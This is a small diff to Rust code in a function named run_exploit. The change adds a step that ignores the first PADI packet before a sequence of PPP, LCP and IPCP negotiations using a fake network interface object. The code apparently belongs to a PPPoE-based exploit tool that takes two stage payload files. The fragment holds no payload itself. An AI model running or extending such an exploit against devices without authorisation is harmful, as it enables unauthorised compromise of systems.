@@ -42,6 +42,7 @@ fn run_exploit(interface_name: String, stage1_path: String, stage2_path: String)
     handler.start();
     // Initial negotiations
     println!("[*] Starting Negotiations ...");
+    expl.ignore_first_padi(&interface);
     expl.ppp_negotiation(&interface, Some(expl.get_fake_ifnet()));
     expl.lcp_negotiation(&interface);
     expl.ipcp_negotiation(&interface);
